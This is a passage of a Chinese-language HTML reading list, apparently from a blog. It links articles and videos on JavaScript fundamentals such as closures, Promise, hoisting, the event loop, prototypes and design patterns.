廖雪峰</a></li><li>📖 <a href="http://www.ruanyifeng.com/blog/2009/08/learning_javascript_closures.html" target="_blank" rel="noopener">学习 Javascript 闭包（Closure） —— 阮一峰</a></li><li>📖 <a href="https://segmentfault.com/a/1190000006671020" target="_blank" rel="noopener">JavaScript 中词法作用域、闭包与跳出闭包 —— SegmentFault</a></li><li>📖 <a href="https://juejin.im/entry/58e70077b123db15eb88dc7e" target="_blank" rel="noopener">JavaScript 深入之词法作用域和动态作用域 —— 掘金</a></li><li>📖 <a href="https://juejin.im/post/5afb0ae56fb9a07aa2138425" target="_blank" rel="noopener">深入理解闭包之前置知识 → 作用域与词法作用域 —— 掘金</a></li><li>📖 <a href="https://stackoverflow.com/questions/1047454/what-is-lexical-scope" target="_blank" rel="noopener">What is lexical scope? —— stackoverflow</a></li><li>📖 [You Don’t Know JS: Scope &amp; Closures —— Kyle Simpson](<a href="https://github.com/fishenal/You-Dont-Know-JS/blob/master/scope" target="_blank" rel="noopener">https://github.com/fishenal/You-Dont-Know-JS/blob/master/scope</a> &amp; closures/ch2.md)</li></ul><hr><h2 id="8-闭包"><a href="#8-闭包" class="headerlink" title="8. 闭包"></a>8. 闭包</h2><h3 id="文章-7"><a href="#文章-7" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Closures" target="_blank" rel="noopener">闭包 —— MDN</a></li><li>📖 <a href="http://www.w3school.com.cn/js/pro_js_functions_closures.asp" target="_blank" rel="noopener">ECMAScript 闭包（closure）—— w3school</a></li><li>📖 <a href="http://www.ruanyifeng.com/blog/2009/08/learning_javascript_closures.html" target="_blank" rel="noopener">学习 Javascript 闭包（Closure） —— 阮一峰</a></li><li>📖 <a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/00143449934543461c9d5dfeeb848f5b72bd012e1113d15000" target="_blank" rel="noopener">闭包 —— 廖雪峰</a></li><li>📖 <a href="https://www.jianshu.com/p/796e903754f1" target="_blank" rel="noopener">一次性搞懂 JavaScript 闭包 —— 简书</a></li><li>📖 <a href="https://segmentfault.com/a/1190000006875662" target="_blank" rel="noopener">JavaScript 闭包 —— SegmentFault</a></li><li>📖 <a href="https://juejin.im/entry/5800eb7da22b9d005b36156e" target="_blank" rel="noopener">js 匿名自执行函数中闭包的高级使用 —— 掘金</a></li><li>📖 <a href="https://juejin.im/entry/59df405251882551bf7e58c6" target="_blank" rel="noopener">高效使用 JavaScript 闭包 —— 掘金</a></li><li>📖 <a href="https://www.cnblogs.com/wangfupeng1988/p/3977924.html" target="_blank" rel="noopener">深入理解 JavaScript 原型与闭包 —— 王福朋</a></li></ul><h3 id="视频-5"><a href="#视频-5" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="http://www.iqiyi.com/w_19rr1amael.html" target="_blank" rel="noopener">JavaScript 闭包和闭包面试题 —— 爱奇艺</a></li><li>📺 <a href="http://www.le.com/ptv/vplay/27478410.html" target="_blank" rel="noopener">js 面向对象闭包数组 11.闭包 —— 乐视</a></li><li>📺 <a href="http://www.le.com/ptv/vplay/30505852.html" target="_blank" rel="noopener">白贺翔_函数(闭包) —— 乐视</a></li></ul><p><strong>⬆️ 返回目录</strong></p><hr><h2 id="9-map-reduce-filter-等高阶函数"><a href="#9-map-reduce-filter-等高阶函数" class="headerlink" title="9. map, reduce, filter 等高阶函数"></a>9. map, reduce, filter 等高阶函数</h2><h3 id="文章-8"><a href="#文章-8" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/001434499355829ead974e550644e2ebd9fd8bb1b0dd721000" target="_blank" rel="noopener">高阶函数 —— 廖雪峰</a></li><li>📖 <a href="https://www.zhangxinxu.com/wordpress/2013/04/es5新增数组方法/" target="_blank" rel="noopener">ES5 中新增的 Array 方法详细说明 —— 张鑫旭</a></li><li>📖 <a href="https://juejin.im/post/5835808067f3560065ed4ab2" target="_blank" rel="noopener">一张图看懂 JavaScript 中数组的迭代方法：forEach、map、filter、reduce、every、some —— 掘金</a></li><li>📖 <a href="https://segmentfault.com/a/1190000012127329" target="_blank" rel="noopener">Transducing（上）－《JavaScript 轻量级函数式编程》 —— SegmentFault</a></li><li>📖 <a href="https://github.com/BuptStEve/blog/issues/15" target="_blank" rel="noopener">JavaScript 函数式编程（三） —— @BuptStEve</a></li></ul><hr><h2 id="10-表达式和语句"><a href="#10-表达式和语句" class="headerlink" title="10. 表达式和语句"></a>10. 表达式和语句</h2><h3 id="文章-9"><a href="#文章-9" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://www.cnblogs.com/xianshenglu/p/8386918.html" target="_blank" rel="noopener">js 表达式与语句 —— 博客园</a></li><li>📖 <a href="https://segmentfault.com/q/1010000004102804" target="_blank" rel="noopener">JS 表达式和语句的区别 —— SegmentFault</a></li><li>📖 <a href="https://blog.csdn.net/mett_smith/article/details/78761247" target="_blank" rel="noopener">JavaScript 中的表达式（expression）和语句/声明（statement） —— CSDN</a></li><li>📖 <a href="https://segmentfault.com/a/1190000004565693" target="_blank" rel="noopener">重讀 Axel 的 Javascript 中的 Expression vs Statement 一文 —— SegmentFault</a></li><li>📖 <a href="http://2ality.com/2012/09/expressions-vs-statements.html" target="_blank" rel="noopener">Expressions versus statements in JavaScript —— Dr. Axel</a></li></ul><hr><h2 id="11-变量提升"><a href="#11-变量提升" class="headerlink" title="11. 变量提升"></a>11. 变量提升</h2><h3 id="文章-10"><a href="#文章-10" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="http://www.runoob.com/js/js-hoisting.html" target="_blank" rel="noopener">JavaScript 变量提升 —— 菜鸟教程</a></li><li>📖 <a href="https://juejin.im/post/59905bea6fb9a03c34192c51" target="_blank" rel="noopener">ES6 变量作用域与提升：变量的生命周期详解 —— 掘金</a></li><li>📖 <a href="https://segmentfault.com/a/1190000004345355#articleHeader5" target="_blank" rel="noopener">[翻译] JavaScript Scoping and Hoisting —— SegmentFault</a></li><li>📖 <a href="http://www.adequatelygood.com/JavaScript-Scoping-and-Hoisting.html" target="_blank" rel="noopener">JavaScript Scoping and Hoisting —— Ben Cherry</a></li></ul><hr><h2 id="12-Promise"><a href="#12-Promise" class="headerlink" title="12. Promise"></a>12. Promise</h2><h3 id="文章-11"><a href="#文章-11" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Using_promises" target="_blank" rel="noopener">使用 promises —— MDN</a></li><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise" target="_blank" rel="noopener">Promise —— MDN</a></li><li>📖 <a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014345008539155e93fc16046d4bb7854943814c4f9dc2000" target="_blank" rel="noopener">Promise — 廖雪峰</a></li><li>📖 <a href="https://www.cnblogs.com/rubylouvre/p/3495286.html" target="_blank" rel="noopener">JavaScript Promise：去而复返 —— 司徒正美</a></li><li>📖 <a href="https://developers.google.com/web/fundamentals/primers/promises#_1" target="_blank" rel="noopener">(上面的原文)JavaScript Promise：简介 —— Web Fundamentals</a></li><li>📖 <a href="https://segmentfault.com/a/1190000011813934" target="_blank" rel="noopener">1 分钟读完《10 分钟学会 JavaScript 的 Async/Await》 —— justjavac</a></li><li>📖 <a href="https://juejin.im/entry/56499ae160b2d1404c4f8834" target="_blank" rel="noopener">JavaScript Promise 迷你书（中文版）</a></li><li>📖 <a href="https://www.cnblogs.com/yunfeifei/p/4453690.html" target="_blank" rel="noopener">JavaScript 进阶之路——认识和使用 Promise，重构你的 Js 代码 —— 博客园</a></li></ul><h3 id="视频-6"><a href="#视频-6" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="https://www.imooc.com/learn/949" target="_blank" rel="noopener">Promise 入门 —— 慕课网</a></li></ul><hr><h2 id="13-立即执行函数-模块化-命名空间"><a href="#13-立即执行函数-模块化-命名空间" class="headerlink" title="13. 立即执行函数, 模块化, 命名空间"></a>13. 立即执行函数, 模块化, 命名空间</h2><h3 id="文章-12"><a href="#文章-12" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="http://www.ruanyifeng.com/blog/2012/10/javascript_module.html" target="_blank" rel="noopener">Javascript 模块化编程（一）：模块的写法 —— 阮一峰</a></li><li>📖 <a href="https://www.jianshu.com/p/4dbf4a4c8ebb" target="_blank" rel="noopener">javascript 模块化编程-详解立即执行函数表达式 —— 简书</a></li><li>📖 <a href="https://juejin.im/entry/57fee360a22b9d005b1d9ae3" target="_blank" rel="noopener">Javascript 的匿名函数与自执行 —— 掘金</a></li><li>📖 <a href="https://segmentfault.com/a/1190000006966358" target="_blank" rel="noopener">前端模块化——技术选型 —— SegmentFault</a></li><li>📖 <a href="https://segmentfault.com/a/1190000015991869#articleHeader8" target="_blank" rel="noopener">谈谈 Js 前端模块化规范 —— SegmentFault</a></li><li>📖 <a href="http://web.jobbole.com/87534/" target="_blank" rel="noopener">函数声明与函数表达式的区别 —— 伯乐在线</a></li></ul><hr><h2 id="14-递归"><a href="#14-递归" class="headerlink" title="14. 递归"></a>14. 递归</h2><h3 id="文章-13"><a href="#文章-13" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://segmentfault.com/q/1010000003942347" target="_blank" rel="noopener">求解释 js 递归 —— SegmentFault</a></li><li>📖 <a href="https://juejin.im/post/5948c0d8fe88c2006a939e2a" target="_blank" rel="noopener">JavaScript 中的递归 —— 掘金</a></li><li>📖 <a href="https://juejin.im/post/59c1d91d6fb9a00a53275f79" target="_blank" rel="noopener">递归（上）－《JavaScript 轻量级函数式编程》 —— 掘金</a></li><li>📖 <a href="https://juejin.im/post/59c87fb46fb9a00a437b1a2e" target="_blank" rel="noopener">递归（下）－《JavaScript 轻量级函数式编程》 —— 掘金</a></li><li>📖 <a href="https://juejin.im/post/5acdd7486fb9a028ca53547c" target="_blank" rel="noopener">尾调用和尾递归 —— 掘金</a></li><li>📖 <a href="https://blog.csdn.net/qianqianstd/article/details/75807462" target="_blank" rel="noopener">几个经典递归问题用 js 实现 —— CSDN</a></li><li>📖 <a href="https://blog.csdn.net/x_i_xw/article/details/72026868" target="_blank" rel="noopener">递归函数的几个例子 —— CSDN</a></li></ul><hr><h2 id="15-算法"><a href="#15-算法" class="headerlink" title="15. 算法"></a>15. 算法</h2><h3 id="文章-14"><a href="#文章-14" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://segmentfault.com/a/1190000020072884" target="_blank" rel="noopener">前端十大经典算法</a></li><li>📖 <a href="https://juejin.im/post/594dfe795188250d725a220a#comment" target="_blank" rel="noopener">在 JavaScript 中学习数据结构与算法 —— 掘金</a></li><li>📖 <a href="https://juejin.im/post/58c9d5fb1b69e6006b686bce" target="_blank" rel="noopener">JS 中可能用得到的全部的排序算法 —— 掘金</a></li><li>📖 <a href="https://www.jianshu.com/p/1b4068ccd505" target="_blank" rel="noopener">JS 家的排序算法 —— 简书</a></li><li>📖 <a href="https://segmentfault.com/a/1190000008593715" target="_blank" rel="noopener">前端常见算法的 JS 实现 —— SegmentFault</a></li><li>📖 <a href="https://www.jackpu.com/qian-duan-mian-shi-zhong-de-chang-jian-de-suan-fa-wen-ti/" target="_blank" rel="noopener">前端面试中的常见的算法问题 ——蒲小花的博客</a></li></ul><h3 id="视频-7"><a href="#视频-7" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="https://www.imooc.com/learn/888" target="_blank" rel="noopener">Javascript 实现二叉树算法 —— 慕课网</a></li></ul><hr><h2 id="16-数据结构"><a href="#16-数据结构" class="headerlink" title="16. 数据结构"></a>16. 数据结构</h2><h3 id="文章-15"><a href="#文章-15" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://www.jianshu.com/p/5e0e8d183102" target="_blank" rel="noopener">来我们浅谈一下 js 的数据结构 —— 简书</a></li><li>📖 <a href="https://www.jianshu.com/nb/16835496" target="_blank" rel="noopener">JavaScript 中的算法与数据结构 —— 简书</a></li><li>📖 <a href="http://blog.sina.com.cn/s/blog_7b9c5e4101017mjt.html" target="_blank" rel="noopener">学 JS 必看-JavaScript 数据结构深度剖析 —— 大道至简的博客</a></li><li>📖 <a href="https://juejin.im/entry/586effe0da2f600053d85a9a" target="_blank" rel="noopener">js 中基础数据结构数组去重问题 —— 掘金</a></li></ul><h3 id="视频-8"><a href="#视频-8" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 📺 <a href="http://www.le.com/ptv/vplay/27606964.html" target="_blank" rel="noopener">JavaScript 数据结构-运算符 —— 乐视</a></li></ul><hr><h2 id="17-消息队列和事件循环"><a href="#17-消息队列和事件循环" class="headerlink" title="17. 消息队列和事件循环"></a>17. 消息队列和事件循环</h2><h3 id="文章-16"><a href="#文章-16" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/EventLoop" target="_blank" rel="noopener">并发模型与事件循环 —— MDN</a></li><li>📖 <a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">JavaScript 运行机制详解：再谈 Event Loop —— 阮一峰</a></li><li>📖 <a href="https://www.cnblogs.com/dong-xu/p/7000163.html" target="_blank" rel="noopener">深入理解 JavaScript 事件循环 —— 博客园</a></li><li>📖 <a href="https://zhuanlan.zhihu.com/p/26229293" target="_blank" rel="noopener">深入浅出 Javascript 事件循环机制 —— 知乎</a></li><li>📖 <a href="https://segmentfault.com/a/1190000014940904#articleHeader7" target="_blank" rel="noopener">JS 事件循环机制（event loop）之宏任务、微任务 —— SegmentFault</a></li><li>📖 <a href="https://segmentfault.com/a/1190000004322358" target="_blank" rel="noopener">JavaScript：彻底理解同步、异步和事件循环 —— SegmentFault</a></li><li>📖 <a href="https://juejin.im/post/5a6547d0f265da3e283a1df7" target="_blank" rel="noopener">从浏览器多进程到 JS 单线程，JS 运行机制最全面的一次梳理 —— 掘金</a></li></ul><hr><h2 id="18-setTimeout-setInterval-和-requestAnimationFrame"><a href="#18-setTimeout-setInterval-和-requestAnimationFrame" class="headerlink" title="18. setTimeout, setInterval 和 requestAnimationFrame"></a>18. setTimeout, setInterval 和 requestAnimationFrame</h2><h3 id="文章-17"><a href="#文章-17" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="http://www.runoob.com/jsref/met-win-settimeout.html" target="_blank" rel="noopener">Window setTimeout() 方法 —— 菜鸟教程</a></li><li>📖 <a href="http://www.runoob.com/jsref/met-win-setinterval.html" target="_blank" rel="noopener">Window setInterval() 方法 —— 菜鸟教程</a></li><li>📖 <a href="https://juejin.im/post/5aa4c47af265da239866e236" target="_blank" rel="noopener">关于 setTimeout —— 掘金</a></li><li>📖 <a href="https://juejin.im/post/5a77f8ce5188257a6d635d76" target="_blank" rel="noopener">你不知道的 Javascript：有趣的 setTimeout —— 掘金</a></li><li>📖 <a href="https://juejin.im/entry/5861ebf01b69e6006ce61d38" target="_blank" rel="noopener">原来你是这样的 setTimeout —— 掘金</a></li><li>📖 <a href="https://segmentfault.com/q/1010000005989491" target="_blank" rel="noopener">setTimeout() 和 setInterval() 本质区别在哪里？ —— SegmentFault</a></li><li>book: <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Window/requestAnimationFrame" target="_blank" rel="noopener">window.requestAnimationFrame —— MDN</a></li><li>📖 <a href="http://www.cnblogs.com/onepixel/p/7078617.html" target="_blank" rel="noopener">requestAnimationFrame 知多少？ —— 博客园</a></li><li>📖 <a href="https://www.zhangxinxu.com/wordpress/2013/09/css3-animation-requestanimationframe-tween-动画算法/" target="_blank" rel="noopener">CSS3 动画那么强，requestAnimationFrame 还有毛线用？ —— 张鑫旭</a></li><li>📖 <a href="https://segmentfault.com/a/1190000014661035" target="_blank" rel="noopener">「JavaScript 定时器」setInterval、setTimeout 和 requestAnimationFrame 浅析 —— SegmentFault</a></li><li>📖 <a href="https://segmentfault.com/a/1190000000386368" target="_blank" rel="noopener">翻译：setInterval 与 requestAnimationFrame 的时间间隔测试 —— SegmentFault</a></li><li>📖 <a href="https://segmentfault.com/q/1010000013909430" target="_blank" rel="noopener">阿里前端面试题：requestAnimationFrame 实现类似 setInterval 的计时器 —— SegmentFault</a></li></ul><h3 id="视频-9"><a href="#视频-9" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="http://v.youku.com/v_show/id_XNTA4OTQ0NzA0.html" target="_blank" rel="noopener">setTimeout 和 setInterval —— 优酷</a></li></ul><hr><h2 id="19-继承-多态和代码复用"><a href="#19-继承-多态和代码复用" class="headerlink" title="19. 继承, 多态和代码复用"></a>19. 继承, 多态和代码复用</h2><h3 id="文章-18"><a href="#文章-18" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://www.cnblogs.com/Leo_wl/p/5734794.html" target="_blank" rel="noopener">JS 面向对象编程之：封装、继承、多态 —— 博客园</a></li><li>📖 <a href="https://www.jianshu.com/p/5cb692658704" target="_blank" rel="noopener">Javascript 的继承与多态 —— 简书</a></li><li>📖 <a href="https://juejin.im/post/59396c96fe88c2006afc2707" target="_blank" rel="noopener">js:面向对象编程，带你认识封装、继承和多态 —— 掘金</a></li><li>📖 <a href="https://zhuanlan.zhihu.com/p/34693209" target="_blank" rel="noopener">JavaScript 中的“多继承” —— 掘金</a></li><li>📖 <a href="https://github.com/TooBug/javascript.patterns/blob/master/chapter6.markdown" target="_blank" rel="noopener">代码复用模式 —— github</a></li><li>📖 <a href="http://www.cnblogs.com/TomXu/archive/2012/04/24/2438050.html" target="_blank" rel="noopener">深入理解 JavaScript：代码复用模式(推荐篇) —— 汤姆大叔</a></li><li>📖 <a href="https://www.cnblogs.com/TomXu/archive/2012/04/23/2438005.html" target="_blank" rel="noopener">深入理解 JavaScript：代码复用模式(避免篇) —— 汤姆大叔</a></li></ul><p><strong>⬆️ 返回目录</strong></p><hr><h2 id="20-按位操作符-类数组对象和类型化数组"><a href="#20-按位操作符-类数组对象和类型化数组" class="headerlink" title="20. 按位操作符, 类数组对象和类型化数组"></a>20. 按位操作符, 类数组对象和类型化数组</h2><h3 id="文章-19"><a href="#文章-19" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators" target="_blank" rel="noopener">按位操作符 —— MDN</a></li><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Typed_arrays" target="_blank" rel="noopener">类数组对象 —— MDN</a></li><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" target="_blank" rel="noopener">类型化数组 —— MDN</a></li><li>📖 <a href="https://www.cnblogs.com/gradolabs/p/4762134.html" target="_blank" rel="noopener">JavaScript ArrayBuffer 浅析 —— 博客园</a></li></ul><hr><h2 id="21-DOM-树和渲染过程"><a href="#21-DOM-树和渲染过程" class="headerlink" title="21. DOM 树和渲染过程"></a>21. DOM 树和渲染过程</h2><h3 id="文章-20"><a href="#文章-20" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document_Object_Model/How_to_create_a_DOM_tree" target="_blank" rel="noopener">如何创建一个 DOM 树 —— MDN</a></li><li>📖 <a href="http://www.w3school.com.cn/htmldom/dom_nodes.asp" target="_blank" rel="noopener">HTML DOM 节点 —— W3school</a></li><li>📖 <a href="http://javascript.ruanyifeng.com/dom/node.html" target="_blank" rel="noopener">DOM 概述 —— 阮一峰</a></li><li>📖 <a href="https://juejin.im/post/583cbbfa61ff4b006ccc41fe" target="_blank" rel="noopener">《JavaScript 闯关记》之 DOM（上）—— 掘金</a></li><li>📖 <a href="https://juejin.im/post/583cbc4961ff4b006ccc44fb" target="_blank" rel="noopener">《JavaScript 闯关记》之 DOM（下）—— 掘金</a></li><li>📖 <a href="https://juejin.im/entry/58314efd8ac2470061bb30fd" target="_blank" rel="noopener">掌握 DOM 操作 —— 掘金</a></li><li>📖 <a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/001434500494451273e6b3dec9d411d9ba841dee8caec45000" target="_blank" rel="noopener">操作 DOM —— 廖雪峰</a></li><li>📖 <a href="https://juejin.im/post/59c60691518825396f4f71a1" target="_blank" rel="noopener">原来 CSS 与 JS 是这样阻塞 DOM 解析和渲染的 —— 掘金</a></li></ul><h3 id="视频-10"><a href="#视频-10" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="https://www.imooc.com/learn/488" target="_blank" rel="noopener">DOM 探索之基础详解篇 —— 慕课网</a></li><li>📺 <a href="https://www.imooc.com/learn/138" target="_blank" rel="noopener">DOM 事件探秘 —— 慕课网</a></li><li>📺 <a href="https://www.imooc.com/learn/530" target="_blank" rel="noopener">jQuery 基础(二)DOM 篇 —— 慕课网</a></li><li>📺 <a href="http://www.iqiyi.com/w_19rr19s08l.html" target="_blank" rel="noopener">JS 操作 DOM 对象属性和方法 —— 爱奇艺</a></li></ul><hr><h2 id="22-new-与构造函数-instanceof-与实例"><a href="#22-new-与构造函数-instanceof-与实例" class="headerlink" title="22. new 与构造函数, instanceof 与实例"></a>22. new 与构造函数, instanceof 与实例</h2><h3 id="文章-21"><a href="#文章-21" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="http://javascript.ruanyifeng.com/oop/basic.html" target="_blank" rel="noopener">构造函数与 new 命令 —— 阮一峰</a></li><li>📖 <a href="http://www.ruanyifeng.com/blog/2010/05/object-oriented_javascript_inheritance.html" target="_blank" rel="noopener">Javascript 面向对象编程（二）：构造函数的继承 —— 阮一峰</a></li><li>📖 <a href="https://blog.csdn.net/SpicyBoiledFish/article/details/71123162" target="_blank" rel="noopener">完整原型链详细图解(构造函数、原型、实例化对象) —— CSDN</a></li><li>📖 <a href="http://www.php.cn/js-tutorial-376246.html" target="_blank" rel="noopener">JavaScript 中构造函数与 new 操作符的实例详解 —— PHP 中文网</a></li><li>📖 <a href="https://blog.csdn.net/yin_991/article/details/80954453" target="_blank" rel="noopener">构造函数、实例、原型、原型链之间的关系 —— CSDN</a></li><li>📖 <a href="https://blog.csdn.net/cecilia620/article/details/71158048" target="_blank" rel="noopener">深入理解 JS—instanceof 和原型链 —— CSDN</a></li><li>📖 <a href="https://www.jianshu.com/p/15ac7393bc1f" target="_blank" rel="noopener">前端基础进阶（九）：详解面向对象、构造函数、原型与原型链 —— 简书</a></li><li>📖 <a href="https://www.jianshu.com/p/60ffc4831bff" target="_blank" rel="noopener">js 用 new 实例化对象与直接调用的 this 的区别 —— 简书</a></li><li>📖 <a href="http://justjavac.com/javascript/2012/12/22/javascript-values-not-everything-is-an-object.html" target="_blank" rel="noopener">JavaScript 并非所有的东西都是对象 —— justjavac</a></li><li>📖 <a href="https://www.ibm.com/developerworks/cn/web/1306_jiangjj_jsinstanceof/" target="_blank" rel="noopener">JavaScript instanceof 运算符深入剖析 —— IBM</a></li></ul><h3 id="视频-11"><a href="#视频-11" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="http://www.le.com/ptv/vplay/27766889.html" target="_blank" rel="noopener">改良版的构造函数 —— 乐视</a></li></ul><hr><h2 id="23-原型继承与原型链"><a href="#23-原型继承与原型链" class="headerlink" title="23. 原型继承与原型链"></a>23. 原型继承与原型链</h2><h3 id="文章-22"><a href="#文章-22" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener">继承与原型链 —— MDN</a></li><li>📖 <a href="https://github.com/bigdots/blog/issues/1" target="_blank" rel="noopener">构造函数、原型与原型链 —— github</a></li><li>📖 <a href="https://github.com/stone0090/javascript-lessons/tree/master/2.5-Prototype" target="_blank" rel="noopener">原型及原型链 —— github(1269 Star)</a></li><li>📖 <a href="https://segmentfault.com/a/1190000004282206" target="_blank" rel="noopener">理清 javascript 中的面向对象(一) 原型继承 —— SegmentFault</a></li><li>📖 <a href="http://justjavac.com/2015/12/09/inheritance-and-the-prototype-chain.html" target="_blank" rel="noopener">JavaScript：继承和原型链(译) —— justjavac</a></li><li>📖 <a href="http://www.cnblogs.com/shuiyi/p/5305435.html" target="_blank" rel="noopener">三张图搞懂 JavaScript 的原型对象与原型链 —— 博客园</a></li><li>📖 <a href="https://blog.csdn.net/the__apollo/article/details/76774698" target="_blank" rel="noopener">一张图让你搞懂 JavaScript 的继承与原型链 —— CSDN</a></li><li>📖 <a href="https://blog.csdn.net/xiaotao_css/article/details/72782416" target="_blank" rel="noopener">JS 高级–原型链(一看就懂，但 18 岁以下请绕道) —— CSDN</a></li><li>📖 <a href="https://www.liaoxuefeng.com/wiki/001434446689867b27157e896e74d51a89c25cc8b43bdb3000/0014344997013405abfb7f0e1904a04ba6898a384b1e925000" target="_blank" rel="noopener">原型继承 —— 廖雪峰</a></li><li>📖 <a href="https://juejin.im/post/58f94c9bb123db411953691b" target="_blank" rel="noopener">JS 原型链与继承别再被问倒了 —— 掘金</a></li><li>📖 <a href="https://juejin.im/entry/5885db221b69e600592253e7" target="_blank" rel="noopener">征服 JavaScript 面试系列：类继承和原型继承的区别 —— 掘金</a></li><li>📖 <a href="https://github.com/mqyqingfeng/Blog/issues/2" target="_blank" rel="noopener">JavaScript 深入之从原型到原型链 —— 冴羽</a></li><li>📖 <a href="https://www.cnblogs.com/wangfupeng1988/p/3977924.html" target="_blank" rel="noopener">深入理解 JavaScript 原型与闭包 —— 王福朋</a></li></ul><h3 id="视频-12"><a href="#视频-12" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="http://www.le.com/ptv/vplay/27552753.html" target="_blank" rel="noopener">JS 高级-07-原型链继承 —— 乐视</a></li><li>📺 <a href="https://v.qq.com/x/page/b0511nwa7d3.html" target="_blank" rel="noopener">JS 原型对象和原型链简介 —— 腾讯视频</a></li></ul><hr><h2 id="24-Object-create-和-Object-assign"><a href="#24-Object-create-和-Object-assign" class="headerlink" title="24. Object.create 和 Object.assign"></a>24. Object.create 和 Object.assign</h2><h3 id="文章-23"><a href="#文章-23" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create" target="_blank" rel="noopener">Object.create —— MDN</a></li><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign" target="_blank" rel="noopener">Object.assign —— MDN</a></li><li>📖 <a href="https://www.imooc.com/article/17591" target="_blank" rel="noopener">Object.create vs Object.assign —— 慕课网手记</a></li><li>📖 <a href="https://blog.csdn.net/DeepLies/article/details/52915143" target="_blank" rel="noopener">JS 中的 Object.assign()、Object.create()、Object.defineProperty() —— CSDN</a></li><li>📖 <a href="http://www.onlyfordream.cn/2018/03/19/es6中object-create和object-assign/" target="_blank" rel="noopener">es6 中 object.create()和 object.assign() —— 风信子博客</a></li><li>📖 <a href="https://github.com/saikojosh/Object-Assign-Deep" target="_blank" rel="noopener">Object-Assign-Deep —— github</a></li></ul><hr><h2 id="25-工厂函数和类"><a href="#25-工厂函数和类" class="headerlink" title="25. 工厂函数和类"></a>25. 工厂函数和类</h2><h3 id="文章-24"><a href="#文章-24" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes" target="_blank" rel="noopener">类 —— MDN</a></li><li>📖 <a href="https://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000/00138682004077376d2d7f8cc8a4e2c9982f92788588322000" target="_blank" rel="noopener">类和实例 —— 廖雪峰</a></li><li>📖 <a href="http://www.ruanyifeng.com/blog/2012/07/three_ways_to_define_a_javascript_class.html" target="_blank" rel="noopener">Javascript 定义类（class）的三种方法 —— 阮一峰</a></li><li>📖 <a href="https://juejin.im/post/59c8c8756fb9a00a681ae5bd" target="_blank" rel="noopener">【译】ES6 的工厂函数 —— 掘金</a></li><li>📖 <a href="https://juejin.im/entry/587992c961ff4b0065edf1ff" target="_blank" rel="noopener">JavaScript 创建对象之单例、工厂、构造函数模式 —— 掘金</a></li></ul><hr><h2 id="26-设计模式"><a href="#26-设计模式" class="headerlink" title="26. 设计模式"></a>26. 设计模式</h2><h3 id="文章-25"><a href="#文章-25" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a href="https://juejin.im/post/59df4f74f265da430f311909" target="_blank" rel="noopener">JavaScript 设计模式 —— 掘金</a></li><li>📖 <a href="http://wiki.jikexueyuan.com/project/javascript-design-patterns/" target="_blank" rel="noopener">学用 JavaScript 设计模式 —— 极客学院</a></li><li>📖 <a href="https://segmentfault.com/a/1190000010914032" target="_blank" rel="noopener">[面试专题]JS 设计模式 —— SegmentFault</a></li><li>📖 <a href="https://github.com/lxj/javascript.patterns" target="_blank" rel="noopener">JavaScript Patterns 中译本 —— github</a></li></ul><h3 id="视频-13"><a href="#视频-13" class="headerlink" title="视频"></a>视频</h3><ul><li>📺 <a href="https://tv.sohu.com/v/dXMvMjQwNzYwNzQ4Lzg5NzM2MDA3LnNodG1s.html" target="_blank" rel="noopener">HTML5 课程大纲 2-11JS 设计模式</a></li></ul><hr><h2 id="27-Memoization"><a href="#27-Memoization" class="headerlink" title="27. Memoization"></a>27. Memoization</h2><h3 id="文章-26"><a href="#文章-26" class="headerlink" title="文章"></a>文章</h3><ul><li>📖 <a 